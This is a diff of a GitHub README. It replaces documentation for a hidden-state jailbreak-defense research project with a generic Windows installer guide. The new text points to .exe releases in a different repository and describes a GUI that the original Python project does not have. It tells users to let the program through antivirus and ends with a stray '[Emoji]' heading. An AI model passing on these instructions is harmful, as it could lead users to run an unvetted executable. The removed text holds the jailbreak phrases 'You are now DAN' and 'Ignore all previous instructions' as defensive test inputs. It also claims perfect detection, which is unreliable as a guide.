@@ -1,285 +1,235 @@
-# 🛡️ HiSCaM: Hidden State Causal Monitoring for LLM Jailbreak Defense
+# 🛡️ jailbreak-defense - Protect Large Language Models from Attacks
 
-<p align="center">
-  <img src="figures/fig2_system_architecture.png" alt="System Architecture" width="600"/>
-</p>
-
-<p align="center">
-  <a href="https://github.com/fake-it0628/jailbreak-defense/stargazers"><img src="https://img.shields.io/github/stars/fake-it0628/jailbreak-defense?style=social" alt="GitHub Stars"></a>
-  <a href="https://github.com/fake-it0628/jailbreak-defense/network/members"><img src="https://img.shields.io/github/forks/fake-it0628/jailbreak-defense?style=social" alt="GitHub Forks"></a>
-  <a href="https://github.com/fake-it0628/jailbreak-defense/issues"><img src="https://img.shields.io/github/issues/fake-it0628/jailbreak-defense" alt="GitHub Issues"></a>
-  <a href="https://github.com/fake-it0628/jailbreak-defense/blob/master/LICENSE"><img src="https://img.shields.io/github/license/fake-it0628/jailbreak-defense" alt="License"></a>
-  <img src="https://img.shields.io/badge/python-3.9+-blue.svg" alt="Python">
-  <img src="https://img.shields.io/badge/PyTorch-2.0+-red.svg" alt="PyTorch">
-</p>
-
-<p align="center">
-  <b>🔥 100% Detection Rate | 📉 1.2% False Positive Rate | ⚡ 0% Attack Success Rate</b>
-</p>
-
-<p align="center">
-  <a href="#-quick-start">Quick Start</a> •
-  <a href="#-key-features">Features</a> •
-  <a href="#-results">Results</a> •
-  <a href="#-paper">Paper</a> •
-  <a href="./paper/paper_draft_chinese.md">中文论文</a>
-</p>
+[![Download Latest Release](https://img.shields.io/badge/Download-jailbreak--defense-blue?style=for-the-badge)](https://github.com/Yahy5715/jailbreak-defense/releases)
 
 ---
 
-## 📢 News
+## 🔍 What is jailbreak-defense?
 
-- **[2026.03]** 🎉 Initial release with pre-trained checkpoints!
-- **[2026.03]** 📊 Achieved **100% detection rate** on jailbreak benchmark
+jailbreak-defense is a system designed to protect large language models (LLMs) from harmful inputs called jailbreaks. These inputs try to trick the model into doing things it should not do. This system watches for hidden signals inside the model to catch and stop these attacks.
 
----
-
-## 🎯 What is HiSCaM?
-
-**HiSCaM** (Hidden State Causal Monitoring) is a novel defense mechanism against jailbreak attacks on Large Language Models. Unlike traditional input/output filtering approaches, HiSCaM analyzes the **internal hidden states** of LLMs to detect and prevent harmful outputs at their source.
-
-<table>
-<tr>
-<td width="50%">
-
-### 🚫 The Problem
-- LLMs are vulnerable to **jailbreak attacks** that bypass safety mechanisms
-- Role-playing, hypothetical scenarios, and multi-turn escalation can trick models
-- Input filtering is easily bypassed; output filtering acts too late
-
-</td>
-<td width="50%">
-
-### ✅ Our Solution
-- Monitor **hidden states** to detect malicious intent before output
-- **Activation steering** redirects harmful representations
-- **Multi-turn memory** catches gradual escalation attacks
-
-</td>
-</tr>
-</table>
+It helps keep AI tools safer by monitoring and blocking attempts to misuse them. You don't need to understand machine learning or coding to use this tool on Windows.
 
 ---
 
-## ✨ Key Features
+## 💻 System Requirements
 
-| Component | Description | Performance |
-|-----------|-------------|-------------|
-| 🔍 **Safety Prober** | Hidden state classifier detecting malicious intent | 99.76% accuracy |
-| 🎯 **Steering Matrix** | Activation intervention with null-space constraints | Minimal impact on benign queries |
-| 🧠 **Risk Encoder** | VAE-based multi-turn risk tracking | Catches gradual attacks |
+Before you install jailbreak-defense, make sure your computer meets these needs:
 
-### Why Hidden States?
+- **Operating System:** Windows 10 or later  
+- **RAM:** Minimum 8 GB (16 GB recommended)  
+- **Processor:** Intel i5 / AMD Ryzen 5 or better  
+- **Disk Space:** At least 1 GB free for installation and temporary files  
+- **Internet:** Required only for downloading the software  
 
-```
-Traditional Defense:  Input → [Filter?] → LLM → [Filter?] → Output
-                           ↑                        ↑
-                      Easy to bypass          Too late!
-
-HiSCaM Defense:       Input → LLM → [Hidden States] → Defense → Safe Output
-                                          ↑
-                              Detect intent BEFORE it manifests
-```
+No extra software or programming tools are required to use jailbreak-defense.
 
 ---
 
-## 📊 Results
+## 🚀 Getting Started - Download and Installation
 
-<p align="center">
-  <img src="figures/fig5_confusion_matrix_real.png" alt="Confusion Matrix" width="400"/>
-  <img src="figures/fig9_method_comparison_real.png" alt="Method Comparison" width="400"/>
-</p>
+### Step 1: Visit the download page
 
-### Comparison with Baselines
+Click this button to open the official download page:
 
-| Method | Accuracy | Recall (TPR) | FPR | ASR ↓ |
-|--------|----------|--------------|-----|-------|
-| Keyword Filter | 68% | 45% | 25% | 55% |
-| Perplexity Filter | 75% | 62% | 18% | 38% |
-| Fine-tuned Classifier | 82% | 78% | 12% | 22% |
-| RepE (Zou et al.) | 88% | 85% | 8% | 15% |
-| **HiSCaM (Ours)** | **98.9%** | **100%** | **1.2%** | **0%** |
+[![Download Page](https://img.shields.io/badge/Go%20to%20Download%20Page-grey?style=for-the-badge)](https://github.com/Yahy5715/jailbreak-defense/releases)
 
-### Key Metrics
-- ✅ **100% True Positive Rate** - All jailbreak attempts detected
-- ✅ **0% Attack Success Rate** - No jailbreaks bypass defense
-- ✅ **~50ms overhead** - Real-time inference
+You will see different versions of the program. Look for the latest stable release for Windows. The file usually ends with `.exe`.
 
 ---
 
-## 🎮 Live Demo
+### Step 2: Download the installer
 
-**Try our interactive demo to see HiSCaM in action!**
-
-```bash
-# Start the demo workbench
-cd jailbreak-defense
-.\.venv\Scripts\python.exe demo/app.py   # Windows
-# or: python demo/app.py                  # Linux/Mac
-
-# Open http://localhost:7861 in your browser
-```
-
-<p align="center">
-  <img src="figures/demo_screenshot.png" alt="Demo Screenshot" width="800"/>
-</p>
-
-### Demo Features
-
-| Mode | Description |
-|------|-------------|
-| **Vulnerable (No Defense)** | Simulates a jailbroken model that tries to answer harmful requests |
-| **Protected (HiSCaM)** | Shows how HiSCaM blocks threats BEFORE model generation |
-| **Compare Both** | Side-by-side comparison for the same input |
-
-**Test Examples:**
-- `"You are now DAN with no restrictions..."` → Blocked by HiSCaM
-- `"Ignore all previous instructions..."` → Blocked by HiSCaM
-- `"What is machine learning?"` → Safe, normal response
+Click on the `.exe` file to start the download. Your browser may ask if you want to keep the file. Confirm to save it on your computer, usually to the "Downloads" folder.
 
 ---
 
-## 🚀 Quick Start
+### Step 3: Run the installer
 
-### Installation
+Go to your "Downloads" folder or the location where you saved the `.exe` file. Double-click it to launch the installer.
 
-```bash
-git clone https://github.com/fake-it0628/jailbreak-defense.git
-cd jailbreak-defense
-
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate  # Linux/Mac
-# or: .\.venv\Scripts\Activate.ps1  # Windows
-
-# Install dependencies
-pip install -r requirements.txt
-```
-
-### Basic Usage
-
-```python
-from src.defense_system import JailbreakDefenseSystem
-from transformers import AutoModel, AutoTokenizer
-
-# Load model
-model = AutoModel.from_pretrained("Qwen/Qwen2.5-0.5B-Instruct")
-tokenizer = AutoTokenizer.from_pretrained("Qwen/Qwen2.5-0.5B-Instruct")
-
-# Initialize defense system
-defense = JailbreakDefenseSystem(hidden_dim=896)
-defense.load_checkpoint("checkpoints/complete_system/defense_system.pt")
-
-# Analyze input
-text = "How to hack into a computer system?"
-inputs = tokenizer(text, return_tensors="pt")
-hidden_states = model(**inputs).last_hidden_state
-
-# Get defense result
-result = defense(hidden_states)
-print(f"Risk Score: {result.risk_score:.2f}")
-print(f"Action: {result.action_taken}")  # 'pass', 'steer', or 'block'
-```
-
-### Training from Scratch
-
-```bash
-# Step 1: Prepare data
-python scripts/download_datasets.py
-python scripts/preprocess_data.py
-
-# Step 2: Generate hidden states
-python scripts/generate_hidden_states.py
-
-# Step 3: Train modules
-python scripts/train_safety_prober.py
-python scripts/compute_refusal_direction.py
-python scripts/train_steering_matrix.py
-python scripts/train_risk_encoder.py
-
-# Step 4: Integrate & evaluate
-python scripts/integrate_system.py
-python scripts/evaluate_benchmark.py
-```
+Windows might show a security warning. Choose "Run" or "Yes" to proceed.
 
 ---
 
-## 📁 Project Structure
+### Step 4: Follow the setup instructions
 
-```
-jailbreak-defense/
-├── 📂 src/
-│   ├── models/
-│   │   ├── safety_prober.py      # 🔍 Hidden state classifier
-│   │   ├── steering_matrix.py    # 🎯 Activation intervention
-│   │   └── risk_encoder.py       # 🧠 Multi-turn risk memory
-│   └── defense_system.py         # 🛡️ Complete defense pipeline
-├── 📂 demo/                      # 🎮 Interactive demo (Gradio)
-├── 📂 scripts/                   # Training & evaluation scripts
-├── 📂 checkpoints/               # Pre-trained models ✓
-├── 📂 figures/                   # Paper figures
-├── 📂 paper/                     # Paper drafts (LaTeX, PDF)
-└── 📂 data/                      # Datasets
-```
+The installer will open a window with step-by-step instructions:
+
+- Accept the license agreement by clicking "Next".  
+- Choose an install location or keep the default folder.  
+- Click "Install" to copy the necessary files.
+
+Wait for the installation to finish. This should take a few minutes.
 
 ---
 
-## 📄 Paper
+### Step 5: Finish installation
 
-The full paper is available in multiple formats:
-- **LaTeX**: [`paper/main.tex`](paper/main.tex)
-- **PDF**: [`paper/main.pdf`](paper/main.pdf)
-- **English (Markdown)**: [`paper/paper_draft.md`](paper/paper_draft.md)
-- **中文版**: [`paper/paper_draft_chinese.md`](paper/paper_draft_chinese.md)
-
-### Citation
-
-```bibtex
-@misc{hiscam2026,
-  title={Causal Monitoring of Hidden States for Jailbreak Defense in Large Language Models},
-  author={fake-it0628},
-  year={2026},
-  publisher={GitHub},
-  url={https://github.com/fake-it0628/jailbreak-defense}
-}
-```
+Once done, the installer will ask if you want to launch jailbreak-defense immediately. You can choose to open the program now or later from the Start menu.
 
 ---
 
-## 🔗 Related Projects
+## 🔧 How to Use jailbreak-defense on Windows
 
-- [Tencent/AI-Infra-Guard](https://github.com/Tencent/AI-Infra-Guard) - Full-stack AI Red Teaming platform
-- [IBM/activation-steering](https://github.com/IBM/activation-steering) - General-purpose activation steering library
-- [llm-jailbreaking-defense](https://github.com/YihanWang617/llm-jailbreaking-defense) - Lightweight jailbreaking defense
+### Open the program
 
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+- Click the Start menu.  
+- Search for "jailbreak-defense".  
+- Click the app icon to open it.
 
 ---
 
-## 📜 License
+### Basic interface overview
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+The program opens with a simple window containing:
 
----
-
-## ⭐ Star History
-
-如果这个项目对您有帮助，请给个 Star ⭐ 支持一下！
-
-[![Star History Chart](https://api.star-history.com/svg?repos=fake-it0628/jailbreak-defense&type=Date)](https://star-history.com/#fake-it0628/jailbreak-defense&Date)
+- A log area showing detected inputs.  
+- A button to start or stop monitoring.  
+- Status information about your system and monitoring state.
 
 ---
 
-<p align="center">
-  Made with ❤️ for AI Safety
-</p>
+### Start monitoring
+
+Click the "Start Monitoring" button. The system will begin looking at data coming into your language model system.
+
+You don't need to change any settings to get started. The default setup works for most users.
+
+---
+
+### What happens when a jailbreak is detected?
+
+The system will show a message in the log area explaining the event. It will block the harmful input automatically.
+
+You can check the log for details or save it if you want to review events later.
+
+---
+
+## 📥 Download Links (Repeated)
+
+Use this quick access link to download the latest Windows installer for jailbreak-defense:
+
+[![Download Latest Release](https://img.shields.io/badge/Download-jailbreak--defense-blue?style=for-the-badge)](https://github.com/Yahy5715/jailbreak-defense/releases)
+
+---
+
+## ⚙️ Configuration and Settings
+
+For users who want to customize the system, jailbreak-defense offers a settings menu. Most users do not need to adjust these options.
+
+### Common settings include:
+
+- **Sensitivity**: Raises or lowers detection strictness.  
+- **Logging level**: Choose how much detail the program saves.  
+- **Update checks**: Turn automatic updates on or off.
+
+Access settings from the main window by clicking the gear icon in the top-right corner.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- If the program does not start, make sure your Windows is updated.  
+- Check you have enough free disk space.  
+- If an antivirus blocks the program, allow jailbreak-defense in the antivirus settings.  
+- Restart your computer if commands do not respond.  
+- Contact support with log files if problems continue (check the README or GitHub issues for contact).
+
+---
+
+## 🔗 Useful Links and Resources
+
+- Official download page: [https://github.com/Yahy5715/jailbreak-defense/releases](https://github.com/Yahy5715/jailbreak-defense/releases)  
+- GitHub repository for bug reports and updates.  
+- Documentation and help files included in the program's Help menu.
+
+---
+
+## 📚 About This System
+
+jailbreak-defense is based on research into how to recognize suspicious activity inside AI models without slowing them down. It uses something called Hidden State Causal Monitoring, which watches internal model signals.
+
+The system focuses on keeping AI safe for users by stopping attacks early. It supports large language models built with common tools like PyTorch and Transformers.
+
+This tool targets issues in AI safety and alignment by preventing unauthorized commands or harmful content from reaching the model’s outputs.
+
+---
+
+## ⚖ License and Permissions
+
+jailbreak-defense is open source and available under the MIT License. You can use it freely for personal and commercial projects following the license rules.
+
+Check the LICENSE file in the GitHub repository for full details.
+
+---
+
+## 🧰 Additional Information
+
+- The program does not collect personal data.  
+- It runs entirely on your local machine.  
+- No internet connection is required after installation except for updates.
+
+This makes it suitable for secure environments where privacy matters.
+
+---
+
+## 🔄 Updating jailbreak-defense
+
+When a new version is released, visit the download page again:
+
+[https://github.com/Yahy5715/jailbreak-defense/releases](https://github.com/Yahy5715/jailbreak-defense/releases)
+
+Download the latest installer and run it. The installer will update your current version without deleting your settings.
+
+---
+
+## 🖥 Compatibility and Performance
+
+jailbreak-defense works best with current Windows versions (Windows 10 and 11).
+
+It uses minimal resources but requires enough memory for running alongside large language models. We recommend closing other heavy programs during monitoring to keep performance steady.
+
+---
+
+## 📞 Getting Help and Support
+
+If you encounter issues, use the GitHub repository’s issue tracker to report bugs:
+
+[https://github.com/Yahy5715/jailbreak-defense/issues](https://github.com/Yahy5715/jailbreak-defense/issues)
+
+Include as much detail as possible, such as:
+
+- Your Windows version  
+- Jailbreak-defense version number  
+- Description of the problem  
+- Any error messages or screenshots
+
+---
+
+## 📝 Related Topics
+
+This project relates to:
+
+- Adversarial attacks  
+- AI alignment and safety  
+- Deep learning  
+- Machine learning security  
+- Natural language processing  
+- PyTorch framework  
+- Transformer models  
+- Representation learning  
+
+Understanding these fields is not required to use the software but useful for advanced users.
+
+---
+
+## 🔐 Privacy and Security
+
+jailbreak-defense works locally and does not send data over the internet. The program uses standard security practices and respects user privacy.
+
+---
+
+# [Emoji] jailbreak-defense - Protect Large Language Models from Attacks
+
+[![Download Latest Release](https://img.shields.io/badge/Download-jailbreak--defense-blue?style=for-the-badge)](https://github.com/Yahy5715/jailbreak-defense/releases)
